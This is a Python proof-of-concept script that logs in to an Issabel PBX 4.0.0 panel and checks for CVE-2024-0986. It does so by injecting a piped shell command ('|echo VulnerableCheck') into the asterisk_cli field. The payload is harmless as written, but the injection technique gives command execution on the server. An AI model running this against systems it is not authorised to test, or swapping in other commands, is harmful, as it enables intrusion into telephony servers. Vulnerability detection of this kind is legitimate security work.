#!/usr/bin/python3
import requests
import argparse
import sys
import warnings

def check_if_https_in_url(url: str, port: int) -> str:
    # Check the 'target' argument the user has provided
    if not url.startswith('https://') and not url.startswith('http://'):
        return f"https://{url}:{port}"
    return f"{url}:{port}"

def login_request(url: str, args: argparse.Namespace) -> requests.sessions.Session | None:
    # Login request to Issabel panel
    generic_cookie = {"issabelSession": "koglv53li3kpgba8ebol01brt4"}
    login_data = {"input_user": args.user, "input_pass": args.password, "submit_login": ''}
    print(f"[+] Trying to log in to {url!r} with credentials '{args.user}:{args.password}'...")
    try:
        session = requests.Session()
        r = session.post(url, cookies=generic_cookie, data=login_data, verify=False)
        if 'Incorrect username or password. Please try again.' in r.text:
            print("[-] Invalid username or password. Please check and try again.")
            sys.exit(1)
        if r.status_code != 200:
            print(f"[-] Ups! Something happened! Got status code {r.status_code!r}.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] An error occurred:\n{e}")
        sys.exit(1)
    print("[+] Authentication successful!")
    return session

def detect_vulnerability(url: str, session: requests.sessions.Session):
    print("[+] Checking for vulnerability...")
    detection_command = "echo VulnerableCheck"
    payload_url = f"{url}/index.php?menu=asterisk_cli"
    payload_data = {'txtCommand': f'xmldoc dump /var/www/backup/x|{detection_command}'}
    r = requests.post(payload_url, cookies=session.cookies.get_dict(), data=payload_data, verify=False)
    if "VulnerableCheck" in r.text:
        print("[+] The application is vulnerable to CVE-2024-0986.")
    else:
        print("[-] The application is not vulnerable to CVE-2024-0986.")

if __name__ == "__main__":
    if len(sys.argv) <= 1:
        print(f"[-] Example usage: python3 {sys.argv[0]} -t 'https://192.1.1.1' -u 'user' -p 'password'")
        sys.exit(1)

    parser = argparse.ArgumentParser(prog=f'python3 {sys.argv[0]}', description='Issabel PBX 4.0.0 - Vulnerability Detection')
    parser.add_argument('-t', '--target', type=str, help='Target IP (e.g., "192.1.1.1" or "https://192.1.1.1").', required=True)
    parser.add_argument('-u', '--user', type=str, help='Username.', required=True)
    parser.add_argument('-p', '--password', type=str, help='Password for this username.', required=True)
    parser.add_argument('--port', type=int, help='Port running Issabel PBX service. Default: 443.', default=443)
    parser.add_argument('--show-warnings', action='store_false', help='Show warnings (if there are).')
    args = parser.parse_args()

    if args.show_warnings:
        warnings.filterwarnings("ignore")

    url = check_if_https_in_url(args.target, args.port)
    session = login_request(url, args)
    detect_vulnerability(url, session)
